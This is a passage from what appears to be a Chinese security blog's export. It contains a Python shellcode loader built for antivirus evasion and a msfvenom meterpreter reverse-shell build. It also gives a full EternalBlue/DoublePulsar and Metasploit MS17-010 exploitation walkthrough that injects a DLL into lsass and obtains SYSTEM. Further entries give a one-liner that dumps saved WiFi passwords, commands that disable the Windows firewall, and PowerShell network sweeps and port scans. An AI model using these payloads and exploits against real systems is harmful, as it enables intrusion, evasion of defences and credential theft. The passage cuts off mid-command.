&quot;\xbd\x7c\x52\xa8\xe1\x70\x25\xf4\x57\x90\x69\xf1\xfb&quot;buf += &quot;\xc2\x44\xac\xa9\xb4\x6d\x84\xfb\x05\x7d\x3b\xfb\x70&quot;buf += &quot;\xa0\x03\x90\xe5\xcf\x77\x3e\xb9\x39\x44\x1e\xa1\x8d&quot;buf += &quot;\x55\x44\x3a\xf7\x8e\xe4\x35\x64\xd7\x63\xcb\xc3\x3d&quot;buf += &quot;\x48\xb3\xaa\x67\xe3\x17\xc1\xaa\x4c\x62\x6a\x4e\xfb&quot;buf += &quot;\x2e\x16\x70\xa3\xc9\x70\xfa\x0e\x7e\xea\xc3\xf3\x9b&quot;buf += &quot;\x9a\xed\x9a\xbe\xcd\x32\xc6\x66\x80\xb0\x92\x20\x55&quot;buf += &quot;\x58\x1e\x5b\xbf\x7f\x54\x7d\x64\xe3\x9b\x81\xd3\x25&quot;buf += &quot;\x65\x2c\x42\xd0\xc3\x07\x5f\xa3\x12\x75\x5a\xcf\x52&quot;buf += &quot;\x62\xf2\xa8\xe0\xcf\x93\x2f\x1b\xb6\x2c\x18\x0e\x0e&quot;buf += &quot;\x42\xaa\xd8\x3b\x01\x1b\x7d\x04\x78\x42\x10\x40\x83&quot;buf += &quot;\xce\xf2\xb4\x2b\x42\xd9\xf6\x84\xa7\xd4\xb3\x2d\x78&quot;buf += &quot;\xb0\x18\xa0\x9c\xfa\x23\xd1\xd7\x65\x36\xf4\x26\xaa&quot;buf += &quot;\x5e\x29\xb8\xdc\x0e\x84\xef\xc0\x71\xbf\xce\x24\xb0&quot;buf += &quot;\x10\x03\x95\x90\x03\x58\xde\x52\x6f\x37\xc4\x5c\xe7&quot;buf += &quot;\x43\x27\x0a\xa7\xa5\x20\xa5\xab\x73\x70\x03\x48\xab&quot;buf += &quot;\x8c\x67\x09\xbc\xec\xd4\x04\x70\xe9\xda\x9e\xe2\xb9&quot;buf += &quot;\xac\xa3\xd6\x65\xd2\xec\x52\x4c\xbe\x8e\x0d\x27\xa1&quot;buf += &quot;\x67\xc2\x9c\x34\x71\xf3\x0c\x7e\xec\x6c\x4f\x98\xb9&quot;buf += &quot;\xe7\x1c\x24\x2e\x68\xc8\x59\xa2\xdc\x7f\xeb\x41\x19&quot;buf += &quot;\x4e\x61\x1e\x9f\xd7\xfb\xb7\x3a\xf0\xbb\xb4\x33\xcf&quot;buf += &quot;\xf9\xb2\xa1\xe9\x67\x0f\x4c\x88\x7d\xc5\x90\x74\xf2&quot;buf += &quot;\x5a\xd4\x25\xca\xaa\x63&quot; #libc = CDLL(&apos;libc.so.6&apos;)PROT_READ = 1PROT_WRITE = 2PROT_EXEC = 4def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception(&quot;Failed to allocate memory&quot;) memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception(&quot;Failed to set protection on buffer&quot;) return addrVirtualAlloc = ctypes.windll.kernel32.VirtualAllocVirtualProtect = ctypes.windll.kernel32.VirtualProtectshellcode = bytearray(buf)whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 666==666: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd)print &quot;..................................&quot;*666memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)old = ctypes.c_long(1)VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode)))shell = cast(memorywithshell, CFUNCTYPE(c_void_p))print &quot;Code By Luan&quot;shell() 免杀来自luan。再编译为exe pywin32 pyinstall1python pyinstaller.py --console --onefile rcoil.py 或则直接生成exe，但是这样免杀效果就不好123456root@RcoIl:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=139.199.xxx.xxx LPORT=8888 -f exe &gt; /root/test.exeNo platform was selected, choosing Msf::Module::Platform::Windows from the payloadNo Arch selected, selecting Arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 333 bytesFinal size of exe file: 73802 bytes 内网msf连接vps选择：armitage-&gt;listeners-&gt;bindHOST写VPS的IP，PORT写6665,shell类型选择meterpreter看图，发现已经链接上了。 测试结果]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NSA工具包利用]]></title>
    <url>%2F2017%2F04%2FNSA%E5%B7%A5%E5%85%B7%E5%8C%85%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[在4月14日下午5点shadowbroker公布了去年从方程式组织窃取的工具包 本次被公开的工具包大小为117.9MB，包含23个黑客工具。解密后的工具包： 方程式ETERNALBLUE复现测试环境 攻击机： windows 7 Pro-64（192.168.1.4）kali 2.0 （192.168.1.29） Python环境：python-2.6.6Python组件：pywin32(一定要使用32位的)方程式ETERNALBLUE下载地址：ETERNALBLUE靶机：window 7 Pro-64（192.168.1.25） 测试综合各个信息将26、27、28三行注释掉再将72行注释掉。然后将fb运行起来如果出现遍历目录的错误，是因为缺少listeningposts目录，在同级下创建一个listeningposts目录。 开始进行配置12345678910111213141516171819202122232425262728[?] Default Target IP Address [] : 192.168.1.25# 输入目标ip[?] Default Callback IP Address [] : 192.168.1.4#输入callback ip[?] Use Redirection [yes] : no#是否使用重定向[?] Base Log directory [D:\logs] :#日志文件的基础目录[*] Checking D:\logs for projectsIndex Project----- -------0 Create a New Project[?] Project [0] : 0#创建新项目。[?] New Project Name : test[?] Set target log directory to &apos;D:\logs\test\z192.168.1.25&apos;? [Yes] : yes#是否设置目标ip对应的日志文件目录在默认的下面[*] Initializing Global State[+] Set TargetIp =&gt; 192.168.1.25[+] Set CallbackIp =&gt; 192.168.1.4[!] Redirection OFF[+] Set LogDir =&gt; D:\logs\test\z192.168.1.25[+] Set Project =&gt; testfb &gt;#配置完成，进入fb命令行界面 使用use查看支持得插件模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384fb &gt; usePlugin Category: Touch====================== Name Version ---- ------- Architouch 1.0.0 Domaintouch 1.1.1 Eclipsedwingtouch 1.0.4 Educatedscholartouch 1.0.0 Emeraldthreadtouch 1.0.0 Erraticgophertouch 1.0.1 Esteemaudittouch 2.1.0 Explodingcantouch 1.2.1 Iistouch 1.2.2 Namedpipetouch 2.0.0 Printjobdelete 1.0.0 Printjoblist 1.0.0 Rpctouch 2.1.0 Smbtouch 1.1.1 Webadmintouch 1.0.1 Worldclienttouch 1.0.1Plugin Category: ImplantConfig============================== Name Version ---- ------- Darkpulsar 1.1.0 Mofconfig 1.0.0Plugin Category: Exploit======================== Name Version ---- ------- Easybee 1.0.1 Easypi 3.1.0 Eclipsedwing 1.5.2 MS08-67漏洞利用工具 Educatedscholar 1.0.0 MS09-050漏洞利用工具 Emeraldthread 3.0.0 MB和 Netbios 漏洞利用工具，使用445端口和 139端口 Emphasismine 3.4.0 通过SMTP漏洞攻击，默认端口25 Englishmansdentist 1.2.0 通过SMTP漏洞攻击，默认端口25 Erraticgopher 1.0.1 通过RPC漏洞攻击，端口为445 Eskimoroll 1.1.1 通过kerberos漏洞进行攻击，默认攻击端口88 Esteemaudit 2.1.0 RDP漏洞利用工具，默认攻击端口为3389 Eternalromance 1.4.0 SMB 和 NBT漏洞利用工具，影响端口139和445 Eternalsynergy 1.0.1 SMB漏洞利用工具，默认端口 445 Ewokfrenzy 2.0.0 Explodingcan 2.0.2 IIS漏洞利用工具,只对Windows2003有影响 Zippybeer 1.0.2 SMTP漏洞利用工具，默认端口 445Plugin Category: Payload======================== Name Version ---- ------- Jobadd 1.1.1 Jobdelete 1.1.1 Joblist 1.1.1 Pcdlllauncher 2.3.1 Processlist 1.1.1 Regdelete 1.1.1 Regenum 1.1.1 Regread 1.1.1 Regwrite 1.1.1 Rpcproxy 1.0.1 Smbdelete 1.1.1 Smblist 1.1.1 Smbread 1.1.1 Smbwrite 1.1.1Plugin Category: Special======================== Name Version ---- ------- Eternalblue 2.2.0 Eternalchampion 2.0.0 选择Eternalblue插件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154fb &gt; use Eternalblue[!] Entering Plugin Context :: Eternalblue[*] Applying Global Variables[+] Set NetworkTimeout =&gt; 60[+] Set TargetIp =&gt; 192.168.1.25[*] Applying Session Parameters[*] Running Exploit Touches[!] Enter Prompt Mode :: EternalblueModule: Eternalblue===================Name Value---- -----NetworkTimeout 60TargetIp 192.168.1.25TargetPort 445VerifyTarget TrueVerifyBackdoor TrueMaxExploitAttempts 3GroomAllocations 12Target WIN72K8R2[!] plugin variables are valid[?] Prompt For Variable Settings? [Yes] :#是否确认可用参数，保持默认[*] NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.[?] NetworkTimeout [60] :#设置超时时间，根据自身网络环境设置，时间长的就多设一些[*] TargetIp :: Target IP Address[?] TargetIp [192.168.1.25] :#输入目标ip[*] TargetPort :: Port used by the SMB service for exploit connection[?] TargetPort [445] :#输入目标端口[*] VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.[?] VerifyTarget [True] :#确认目标信息[*] VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.[?] VerifyBackdoor [True] :#确认后台是否安装[*] MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.[?] MaxExploitAttempts [3] :#设置最大尝试次数[*] GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetupallocations (XK/2K3) to do.[?] GroomAllocations [12] :#设置buffer，保持默认即可[*] Target :: Operating System, Service Pack, and Architecture of target OS 0) XP Windows XP 32-Bit All Service Packs *1) WIN72K8R2 Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs[?] Target [1] : 1#根据目标指纹而确定[!] Preparing to Execute Eternalblue[*] Mode :: Delivery mechanism *0) DANE Forward deployment via DARINGNEOPHYTE 1) FB Traditional deployment from within FUZZBUNCH[?] Mode [0] : 1[+] Run Mode: FB#设置攻击模式[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure?(y/n) [Yes] : yes#是否确认使用本地的fuzzbunch插件，默认即可[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Local Tunnel - local-tunnel-1[?] Destination IP [192.168.1.25] :[?] Destination Port [445] :[+] (TCP) Local 192.168.1.25:445#确认目标信息[+] Configure Plugin Remote TunnelsModule: Eternalblue===================Name Value---- -----DaveProxyPort 0NetworkTimeout 60TargetIp 192.168.1.25TargetPort 445VerifyTarget TrueVerifyBackdoor TrueMaxExploitAttempts 3GroomAllocations 12ShellcodeBufferTarget WIN72K8R2[?] Execute Plugin? [Yes] :#确认执行插件[*] Executing Plugin[*] Connecting to target for exploitation. [+] Connection established for exploitation.[*] Pinging backdoor... [+] Backdoor not installed, game on.[*] Target OS selected valid for OS indicated by SMB reply[*] CORE raw buffer dump (28 bytes):0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes0x00000010 73 69 6f 6e 61 6c 20 37 36 30 30 00 sional 7600.[*] Building exploit buffer[*] Sending all but last fragment of exploit packet ................DONE.[*] Sending SMB Echo request[*] Good reply from SMB Echo request[*] Starting non-paged pool grooming [+] Sending SMBv2 buffers .............DONE. [+] Sending large SMBv1 buffer..DONE. [+] Sending final SMBv2 buffers......DONE. [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] Sending SMB Echo request[*] Good reply from SMB Echo request[*] Sending last fragment of exploit packet! DONE.[*] Receiving response from exploit packet [+] ETERNALBLUE overwrite completed successfully (0xC000000D)![*] Sending egg to corrupted connection.[*] Triggering free of corrupted buffer.[*] Pinging backdoor... [+] Backdoor returned code: 10 - Success! [+] Ping returned Target architecture: x64 (64-bit) [+] Backdoor installed=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[*] CORE sent serialized output blob (2 bytes):0x00000000 08 00 ..[*] Received output parameters from CORE[+] CORE terminated with status code 0x00000000[+] Eternalblue Succeededfb Special (Eternalblue) &gt; 生成dll使用攻击机2 kali的msfvenom 生成一下dll劫持文件， 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload123456root@RcoIl:~/桌面# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.29 LPORT=1024 -f dll &gt; /root/桌面/test.dllNo platform was selected, choosing Msf::Module::Platform::Windows from the payloadNo Arch selected, selecting Arch: x86_64 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 510 bytesFinal size of dll file: 5120 bytes 启动msfconsole进行监听。1234567891011msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set lhost 192.168.1.29lhost =&gt; 192.168.1.29msf exploit(handler) &gt; set lport 1024lport =&gt; 1024msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit[*] Started reverse TCP handler on 192.168.1.29:1024 [*] Starting the payload handler... 使用doubelpulsar插件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133fb Special (Eternalblue) &gt; use doublepulsar[!] Entering Plugin Context :: Doublepulsar[*] Applying Global Variables[+] Set NetworkTimeout =&gt; 60[+] Set TargetIp =&gt; 192.168.1.25[*] Applying Session Parameters[!] Enter Prompt Mode :: DoublepulsarModule: Doublepulsar====================Name Value---- -----NetworkTimeout 60TargetIp 192.168.1.25TargetPort 445OutputFileProtocol SMBArchitecture x86Function OutputInstall[!] Plugin Variables are NOT Valid[?] Prompt For Variable Settings? [Yes] :[*] NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1for no timeout.[?] NetworkTimeout [60] :[*] TargetIp :: Target IP Address[?] TargetIp [192.168.1.25] :[*] TargetPort :: Port used by the Double Pulsar back door[?] TargetPort [445] :[*] Protocol :: Protocol for the backdoor to speak *0) SMB Ring 0 SMB (TCP 445) backdoor 1) RDP Ring 0 RDP (TCP 3389) backdoor[?] Protocol [0] :[*] Architecture :: Architecture of the target OS *0) x86 x86 32-bits 1) x64 x64 64-bits[?] Architecture [0] : 1[+] Set Architecture =&gt; x64[*] Function :: Operation for backdoor to perform *0) OutputInstall Only output the install shellcode to a binary file on disk. 1) Ping Test for presence of backdoor 2) RunDLL Use an APC to inject a DLL into a user mode process. 3) RunShellcode Run raw shellcode 4) Uninstall Remove&apos;s backdoor from system[?] Function [0] : 2[+] Set Function =&gt; RunDLL[*] DllPayload :: DLL to inject into user mode[?] DllPayload [] : E:\test.dll[+] Set DllPayload =&gt; E:\test.dll[*] DllOrdinal :: The exported ordinal number of the DLL being injected to call[?] DllOrdinal [1] :[*] ProcessName :: Name of process to inject into[?] ProcessName [lsass.exe] :[*] ProcessCommandLine :: Command line of process to inject into[?] ProcessCommandLine [] :[!] Preparing to Execute Doublepulsar[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Local Tunnel - local-tunnel-1[?] Destination IP [192.168.1.25] :[?] Destination Port [445] :[+] (TCP) Local 192.168.1.25:445[+] Configure Plugin Remote TunnelsModule: Doublepulsar====================Name Value---- -----NetworkTimeout 60TargetIp 192.168.1.25TargetPort 445DllPayload E:\test.dllDllOrdinal 1ProcessName lsass.exeProcessCommandLineProtocol SMBArchitecture x64Function RunDLL[?] Execute Plugin? [Yes] :[*] Executing Plugin[+] Selected Protocol SMB[.] Connecting to target...[+] Connected to target, pinging backdoor... [+] Backdoor returned code: 10 - Success! [+] Ping returned Target architecture: x64 (64-bit) - XOR Key: 0x6CDC31C9 SMB Connection string is: Windows 7 Professional 7600 Target OS is: 7 x64 Target SP is: 0 [+] Backdoor installed [+] DLL built [.] Sending shellcode to inject DLL [+] Backdoor returned code: 10 - Success! [+] Backdoor returned code: 10 - Success! [+] Backdoor returned code: 10 - Success! [+] Command completed successfully[+] Doublepulsar Succeeded 反弹shell成功。 SMB漏洞批量检测扫描脚本的下载和加载12root@kali:~# cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smbroot@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb# wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb 漏洞扫描的使用方法123456789101112131415161718192021msf &gt; use auxiliary/scanner/smb/smb_ms_17_010msf auxiliary(smb_ms_17_010) &gt; set RHOSTS 192.168.2.1-255RHOSTS =&gt; 192.168.2.1-255msf auxiliary(smb_ms_17_010) &gt; set THREADS 10THREADS =&gt; 10msf auxiliary(smb_ms_17_010) &gt; run[*] Scanned 27 of 255 hosts (10% complete)[*] Scanned 51 of 255 hosts (20% complete)[*] Scanned 77 of 255 hosts (30% complete)[*] 192.168.2.103:445 - Connected to \\192.168.2.103\IPC$ with TID = 2048[*] 192.168.2.103:445 - Received STATUS_INSUFF_SERVER_RESOURCES with FID = 0[!] 192.168.2.103:445 - Host is likely VULNERABLE to MS17-010![*] Scanned 103 of 255 hosts (40% complete)[*] Scanned 131 of 255 hosts (51% complete)[*] Scanned 153 of 255 hosts (60% complete)[*] Scanned 179 of 255 hosts (70% complete)[*] Scanned 205 of 255 hosts (80% complete)[*] Scanned 230 of 255 hosts (90% complete)[*] Scanned 255 of 255 hosts (100% complete)[*] Auxiliary module execution completedmsf auxiliary(smb_ms_17_010) &gt; 将得到的结果进行验证 如果不想使用上面的方法进行验证，那也可以使用MSF直接验证 smb命令执行msf利用过程123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869msf &gt; use exploit/windows/smb/ms17-010 msf exploit(ms17-010) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(ms17-010) &gt; set rhost 192.168.2.103rhost =&gt; 192.168.2.103msf exploit(ms17-010) &gt; set lhost 192.168.2.105lhost =&gt; 192.168.2.105msf exploit(ms17-010) &gt; show optionsModule options (exploit/windows/smb/ms17-010): Name Current Setting Required Description ---- --------------- -------- ----------- DOUBLEPULSARPATH //usr/share/metasploit-framework/modules/exploits/windows/smb/deps yes Path directory of Doublepulsar ETERNALBLUEPATH //usr/share/metasploit-framework/modules/exploits/windows/smb/deps/ yes Path directory of Eternalblue PROCESSINJECT lsass.exe yes Name of process to inject into (Change to lsass.exe for x64) RHOST 192.168.2.103 yes The target address RPORT 445 yes The SMB service port (TCP) TARGETARCHITECTURE x86 yes Target Architecture (Accepted: x86, x64) WINEPATH /root/.wine/drive_c/ yes WINE drive_c pathPayload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.2.105 yes The listen address LPORT 4444 yes The listen portExploit target: Id Name -- ---- 8 Windows Server 2008 R2 (x86) (x64)msf exploit(ms17-010) &gt; set TARGETARCHITECTURE x64TARGETARCHITECTURE =&gt; x64msf exploit(ms17-010) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic 1 Windows XP (all services pack) (x86) (x64) 2 Windows Server 2003 SP0 (x86) 3 Windows Server 2003 SP1/SP2 (x86) 4 Windows Server 2003 (x64) 5 Windows Vista (x86) 6 Windows Vista (x64) 7 Windows Server 2008 (x86) 8 Windows Server 2008 R2 (x86) (x64) 9 Windows 7 (all services pack) (x86) (x64)msf exploit(ms17-010) &gt; set targets 9targets =&gt; 9msf exploit(ms17-010) &gt; exploit [*] Started reverse TCP handler on 192.168.2.105:4444 [*] 192.168.2.103:445 - Generating Eternalblue XML data[*] 192.168.2.103:445 - Generating Doublepulsar XML data[*] 192.168.2.103:445 - Generating payload DLL for Doublepulsar[*] 192.168.2.103:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll[*] 192.168.2.103:445 - Launching Eternalblue...[+] 192.168.2.103:445 - Backdoor is already installed[*] 192.168.2.103:445 - Launching Doublepulsar...[*] Sending stage (1189423 bytes) to 192.168.2.103[*] Meterpreter session 1 opened (192.168.2.105:4444 -&gt; 192.168.2.103:62662) at 2017-04-29 15:43:03 +0800[+] 192.168.2.103:445 - Remote code executed... 3... 2... 1...meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEMmeterpreter &gt; sysinfoComputer : RCOIL-PCOS : Windows 7 (Build 7600).Architecture : x64System Language : zh_CNDomain : WORKGROUPLogged On Users : 1Meterpreter : x64/windowsmeterpreter &gt; 参考：Explotando CVE-2017-010 con Eternalblue y Doublepulsar desde Metasploit 后续http://www.freebuf.com/?s=NSA]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>shadowbroker</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小技巧]]></title>
    <url>%2F2017%2F04%2F%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[一些平时用到的小技巧，权当是一些笔记 cmd一键获取所有连接过的wifi 密码12for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clearpause SSH命令行上传/下载文件上传：123scp /path/file（这部分为本地的路径） user（远端目标用户名）@host（远端目标IP）:/pathorfile（文件存储路径）例如 ：scp /root/Desktop/demo.php root@192.168.40.111:/var/www/html/ 下载：12scp user（远端用户名）@host（远端IP）:/path/file（下载文件在远端的路径） localpathorfile（本地文件存放路径）例如 ：scp root@192.168.40.111:/var/www/html/demo.zip /root/ 查看目录或文件：1ssh user@host command ls &quot;/path/*.tgz&quot; 判断系统安装杀软情况1wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * 判断.net版本```reg query “HKLM\Software\Microsoft\NET Framework Setup\NDP” /s /v version | findstr /i version | sort /+26 /r]]></content>
      <categories>
        <category>feeling</category>
      </categories>
      <tags>
        <tag>feeling</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerShell简单使用]]></title>
    <url>%2F2017%2F04%2FPowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[总结一些PowerShell的简单操作 ping扫描在横向pentest的时候，在nmap之类的工具使用不了，而PowerShell作为Windows的固有组件,用起来更加高效，而且能更加隐蔽的运行。 ping扫描11..255 | % &#123;echo &quot;192.168.1.$_&quot;; ping -n 1 -w 100 192.168.1.$_&#125; | Select-String ttl demo:此命令按顺序ping循环中的每个IP地址。并且过滤掉没有响应的IP，使用Select-String查找并只显示包含文本“TTL”的行。 命令分解1..255 | % {echo &quot;192.168.1.$_&quot;; ping -n 1 -w 100 192.168.1.$_} | Select-String ttl 1234567891.255 - 产生从1到255的数字列表| - 将每个数字作为对象传递到循环中％ - PowerShell中的％运算符是foreach对象的别名，用于启动循环。依次循环执行&#123;&#125;之间的内容echo &quot;192.168.1.$_&quot;; - 打印出IP地址。$_是一个意味着当前对象的变量。当前对象与循环当前所在的数字（1..255）相关。ping - 两个节点之间的ICMP连接的Packet Internet groper实用程序测试。-n 1 - 发送手动设置的次数在1之后停止-w 100 - 超时前等待的毫秒数。这可能需要根据目标环境的延迟进行调整192.168.1.$_ - 要ping的IP地址| Select-String ttl - 将循环中的所有输出管道输入到Select-String中。过滤所有没有ttl的行。 command metrics1Measure-Command &#123;&#125; demo:通过演示并行执行，ping扫描能够枚举网络增加的速率。虽然限于4个并行线程，我们实现了比单线程快62％的结果。产生额外的线程可能会增加枚举速度甚至更高。 整段扫描1workflow ParallelSweep &#123; foreach -parallel -throttlelimit 4 ($i in 1..255) &#123;ping -n 1 -w 100 192.168.1.$i&#125;&#125;; ParallelSweep | Select-String ttl demo: 命令分解workflow ParallelSweep { foreach -parallel -throttlelimit 4 ($i in 1..255) {ping -n 1 -w 100 192.168.1.$i}}; ParallelSweep | Select-String ttl12345678workflow ParallelSweep &#123;&#125; - 声明一个名为Parallel-Sweep的工作流程foreach - 开始循环-parallel - 并行执行循环-throttlelimit 4 - 将并发线程数限制为4($i in 1..255) - 运行循环1到255次ping -n 1 -w 100 192.168.1.$i - Ping IP地址ParallelSweep - 调用工作流ParallelSweep| Select-String ttl - 过滤Parallel-Sweep的输出。只打印有包含“ttl”的行 系统类型检测10..192 | % &#123; $a = $_; 1..255 | % &#123; $b = $_; ping -n 1 -w 10 &quot;192.168.$a.$b&quot; | select-string TTL | % &#123; if ($_ -match &quot;ms&quot;) &#123; $ttl = $_.line.split(&apos;=&apos;)[2] -as [int]; if ($ttl -lt 65) &#123; $os = &quot;Linux&quot; &#125; ElseIf ($ttl -gt 64 -And $ttl -lt 129) &#123; $os = &quot;Windows&quot; &#125; else &#123; $os = &quot;Cisco&quot;&#125;; write-host &quot;192.168.$a.$b OS: $os&quot;; echo &quot;192.168.$a.$b&quot; &gt;&gt; scan_results.txt &#125;&#125;&#125; &#125; 使用一个多子网扫描器来构建一个可访问主机的报告,甚至可以通过评估TTL值来辅助攻击目标，来辨识非常基本的操作系统指纹。demo: 小结**这些简单的脚本有很多方法来扩展，只有这样，才能在开创网络之后才能收集更多所需要的有关网络信息。这些技术在一定场景中对目标识别的过程中特别有用。 添加防火墙规则平时在本地搭建的环境和培训环境当中，防火墙都是被禁用的，这样可以促进学习体验。然而，作为pentest的一部分，绕过和操纵防火墙正是一天的工作内容。Windows防火墙是当今遇到的最常见的数据包过滤障碍。虽然它不一定是最强大的解决方案，但是在不直接访问GUI的情况下操作可能是最棘手的。幸运的是，PowerShell支持一套强大的集成功能，可以利用它。 禁用/启用Windows防火墙12Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled FalseSet-NetFirewallProfile -Profile Domain,Public,Private -Enabled True 添加允许特定IP地址连接1New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress 192.168.1.100 命令分解1234New-NetFirewallRule - 用于创建新的防火墙规则的PowerShell cmdlet-Action - 禁止或允许。默认是允许-DisplayName Pentester-C2 - 在GUI中或通过命令行查看规则的名称-RemoteAddress 192.168.1.100 - 允许入站连接的地址 允许特定端口的连接1new-netfirewallrule -action allow -localport 80 -direction inbound -protocol tcp -displayname pentester-c2 命令分解123-localport 80 - 应用规则的本地端口-direction inbound - 将规则应用到的方向。这是入站或出站-protocol tcp - 指定TCP / UDP端口时，用户还必须指定应用规则的两个协议中的哪一个。该值也可以是协议号0-255或另一个协议名称（例如：ICMPv4）。 端口扫描在平时的pentest中，nmap是端口扫描的最佳选择，但有时候可能不是一个最佳的选择。来看一下使用PowerShell进行基本端口扫描功能的方法。要在一行中创建PowerShell端口扫描器，我们需要组合三个不同的组件。创建一系列对象，循环遍历每个对象，并将每个对象的信息输出到屏幕。 端口扫描11..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.7&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null demo: 命令分解123456781..1024 - 创建1..1024之间的变量范围| - 管道操作员将对象传递到循环中％ - PowerShell中的％运算符是foreach对象的别名，用于启动循环。循环依次执行&#123;&#125;之间的内容echo - 将以下输出打印到屏幕上new-object Net.Sockets.TcpClient - Net.Sockets TcpClient类的一个实例，允许我们将socket连接到TCP端口Connect（“192.168.1.7”，$_）） - 调用TcpClient类上的Connect函数，参数为192.168.1.7和port $_。$ _是一个意味着当前对象的变量。当前对象与循环当前所在的数字（1..1024）相关。“Port $_ is open！”） - 打印Port＃已打开！当程序找到一个打开的端口。2&gt; $ null - 这告诉PowerShell不显示遇到的任何错误 扫描单个端口的IP范围1foreach ($ip in 1..20) &#123;Test-NetConnection -Port 80 -InformationLevel &quot;Detailed&quot; 192.168.1.$ip&#125; demo: 命令分解12345foreach（$ ip in 1..20）&#123;&#125; - 循环数字1到20Test-NetConnection - Test-NetConnection是一种用于测试不同类型网络连接的实用程序。-Port 80 - 检查80端口的可用性-InformationLevel &quot;Detailed&quot; - 提供详细的输出信息192.168.1.$ip - 尝试根据列出的IP地址连接到端口80。在这个例子中，$ip变量从1-20循环。 构建扫描仪遍历系统和端口也是可行的 自定义IP范围和端口范围11..20 | % &#123; $a = $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125; demo:此版本的命令将扫描的IP地址192.168.1.1-20和ports 1-1024。请注意，可能需要一段时间才能完成。更有效的替代方法可能是指定要手动查找的端口。喜欢这个：11..20 | % &#123; $a = $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125; 测试出口过滤11..1024 | % 